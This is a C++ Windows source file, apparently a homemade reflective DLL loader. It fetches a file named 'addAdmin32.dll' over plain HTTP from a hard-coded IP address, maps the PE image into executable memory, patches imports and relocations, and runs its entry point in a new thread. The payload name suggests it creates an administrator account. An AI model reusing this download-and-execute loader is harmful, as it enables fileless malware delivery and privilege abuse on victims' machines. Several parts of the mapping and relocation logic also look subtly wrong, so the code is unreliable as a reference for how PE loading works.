#include <stdio.h>
#include <Windows.h>
#include <cstring>
#include <winhttp.h>

#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "winhttp.lib")
int main(int argc, char* argv[]) {

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    DWORD dwProcessId;
    HANDLE hProcess;
    HANDLE hHeap;
    HANDLE hThread;
    LPVOID lpHeapBuffer;
    LPSTR pszDecrypt;
    LPSTR pszOutBuffer;
    LPSTR pszOutCompleteBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"192.168.138.145",
            INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/addAdmin32.dll",
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL
            //WINHTTP_FLAG_SECURE
        );

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    //could be GetCurrentProcss <- retrieves pseudo handle ||FindWindowA 
    //-> GetProcessId aswell
    dwProcessId = GetProcessId((HANDLE)-1);
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
    if (!hProcess) {
        printf("couldnt close process handle 0x%X", GetLastError());
        return -1;
    }
    //size of bytes to allocate on the heap this will be the size for our dll to load
    int iBufferSize = 20000;
    hHeap = GetProcessHeap();
    if (!hHeap) {
        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    lpHeapBuffer = HeapAlloc(hHeap, NULL,iBufferSize);
    if (!lpHeapBuffer) {
        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
        CloseHandle(hHeap);
        CloseHandle(hProcess);
        return -1;
        }
    
    //pszOutCompleteBuffer =new char[4096];
    int iOffset = 0;
    // Keep checking for data until there is nothing left.
    if (bResults && iOffset <=iBufferSize)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            }
           
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                    
                }
                else
                {
                    printf("%s", pszOutBuffer);
                    //ReadFile(hRequest, &lpHeapBuffer[iOffset], dwSize+1, NULL, NULL)
                    // could also go with virtual alloc
                    std::memcpy((LPVOID)(((char *)lpHeapBuffer + iOffset)), pszOutBuffer, dwSize);
                    //sprintf_s(pszOutCompleteBuffer+iOffset-dwSize, sizeof(pszOutBuffer), "%s", pszOutBuffer);
                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
                iOffset += dwSize;
            }
        } while (dwSize > 0);
    }
    char* bpBuffer = (char*)lpHeapBuffer;
    //BOOL VirtualProtectEx(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
    //BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
    auto lpDosHeaderOld = reinterpret_cast<IMAGE_DOS_HEADER*>(bpBuffer);
    auto lpPeHeaderOld = reinterpret_cast<IMAGE_NT_HEADERS*>(bpBuffer + lpDosHeaderOld->e_lfanew);
    void * lpImage  =  VirtualAlloc(NULL, lpPeHeaderOld->OptionalHeader.SizeOfImage,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    if (!lpImage) {
        printf("couldnt allocate memory : 0x%X\n", GetLastError());
        HeapFree(hHeap, 0, lpHeapBuffer);
        CloseHandle(hProcess);
    }

    //map header
    std::memcpy(lpImage, bpBuffer, 0x1000);
    
    //map sections
    int iNumberSections = lpPeHeaderOld->FileHeader.NumberOfSections;
    DWORD iOffsetStartSectionHeader = lpDosHeaderOld->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    auto lpStartSectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(bpBuffer +iOffsetStartSectionHeader);
    int iVSectionSize =lpPeHeaderOld->OptionalHeader.SectionAlignment;
    for (int i = 0; i < iNumberSections; i++) {
        int s = lpStartSectionHeader[i].SizeOfRawData;
        
        //map each section at the correct offset
        std::memcpy((LPVOID *)((DWORD)lpImage +(DWORD)iVSectionSize * (i+1)), bpBuffer + lpStartSectionHeader[i].PointerToRawData, iVSectionSize);
                   
    }

    (IMAGE_DOS_HEADER*)lpImage;
    auto lpPeHeader = reinterpret_cast<IMAGE_NT_HEADERS*>((DWORD)lpImage+lpDosHeaderOld->e_lfanew);
    //fix image base
    std::memcpy(&(lpPeHeader->OptionalHeader.ImageBase) , &lpImage, sizeof(lpPeHeader->OptionalHeader.ImageBase));
    //fix imports                              fix this !!!
    auto lpImportDirectory = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress+(DWORD) lpImage);
    // each directory entry has a size of 4 bytes*5 one directory is always empty
    int iNumberOfImports= (lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / (4*5))-1;    
    for (int i = 0; i < iNumberOfImports;i++ ) {
        //might need to fix this
        HMODULE hDLLModule = LoadLibraryA((LPCSTR)(lpImportDirectory[i].Name+(DWORD)lpImage));
        //go over each IAT entry
        for (int k = 0; k < lpPeHeader->OptionalHeader.SectionAlignment; k += 4) {
            //check if entry is 00000 aka end of imports
            if (!*(DWORD *)(lpImportDirectory[i].OriginalFirstThunk + k+(DWORD)lpImage))
                break;
            // load proc address by name in INT
            // k describes the distanc between name pointers +2== hintsize
            DWORD* dwTableNamePointer = (DWORD *)(lpImportDirectory[i].OriginalFirstThunk + k + (DWORD)lpImage);
            DWORD* dwTableAddressPointer = (DWORD *)(lpImportDirectory[i].FirstThunk + k + (DWORD)lpImage);
            LPCSTR lpszProcName = (LPCSTR)(*dwTableNamePointer) +2+(DWORD)lpImage;
            auto lpProcAddr =GetProcAddress(hDLLModule, lpszProcName);
            // copy proc address to the IAT 
            std::memcpy(dwTableAddressPointer, &lpProcAddr, sizeof(lpProcAddr));
        }
    
    } 


    //fix relocations
    int iSizeCounter = lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    auto lpBaseRelocDir = reinterpret_cast<IMAGE_BASE_RELOCATION*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress+(DWORD)lpImage);
    DWORD iImageBaseOld = lpPeHeaderOld->OptionalHeader.ImageBase;
    DWORD iImageBaseNewDelta =(DWORD) lpImage - iImageBaseOld;
    DWORD iRVABlock;
    DWORD iRVABlockSize;

    for (int bOffsetReloc = 0; bOffsetReloc < iSizeCounter;) {
        iRVABlock =((IMAGE_BASE_RELOCATION *)(bOffsetReloc+(BYTE *)lpBaseRelocDir))->VirtualAddress;
        iRVABlockSize = ((IMAGE_BASE_RELOCATION*)(bOffsetReloc+(BYTE *)lpBaseRelocDir))->SizeOfBlock;
        bOffsetReloc += iRVABlockSize;
        //skip last entry
        for (int k = sizeof(DWORD) * 2; k < iRVABlockSize - sizeof(WORD); k += sizeof(WORD)) {
            WORD* lpFixupAddress = (WORD*)((BYTE*)lpBaseRelocDir + k);
            DWORD* lpAddressToChange = (DWORD*)((*lpFixupAddress & 0x0FFF) +iRVABlock +(DWORD)lpImage);
            DWORD lpNewAddr = ((*lpAddressToChange ^ iImageBaseOld )+(DWORD)lpImage);
            std::memcpy(lpAddressToChange, &lpNewAddr, sizeof(DWORD));
        }


    }
    int iSizeOfCode = lpPeHeader->OptionalHeader.SectionAlignment;
    printf("\nBase of Image%x\n", (DWORD)lpImage);
    printf("\nBase of Code%x\n", lpPeHeader->OptionalHeader.BaseOfCode);
    //                                                                              64 vs 32 bit on base of code
    //if (VirtualProtect((LPVOID)((DWORD)lpImage+ 0x1000), lpPeHeader->OptionalHeader.BaseOfData - lpPeHeader->OptionalHeader.BaseOfCode, PAGE_EXECUTE_READ, NULL))
    if (VirtualProtect((LPVOID)((DWORD)lpImage + 0x1000), iRVABlockSize *iNumberSections, PAGE_EXECUTE_READ, NULL))
        printf("Coldnt change PAGE protection: %x\n", GetLastError());
    
    
    LPTHREAD_START_ROUTINE lpEntry = (LPTHREAD_START_ROUTINE)(lpPeHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)lpImage);

    HANDLE hThreadInjected=CreateThread(NULL, 0, lpEntry, NULL, DLL_PROCESS_ATTACH, NULL);
    if (!hThreadInjected) {
        printf("thread couldnt be created with error: %x", GetLastError());
    }
   
    HeapFree(hHeap, 0, lpHeapBuffer);
    //CloseHandle(hHeap);
    for (int i = 0; i < 10000; i++) {
        Sleep(1);
    }
    CloseHandle(hProcess);
    //printf("%s", pszOutCompleteBuffer);
    //delete[] pszOutCompleteBuffer;
    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

}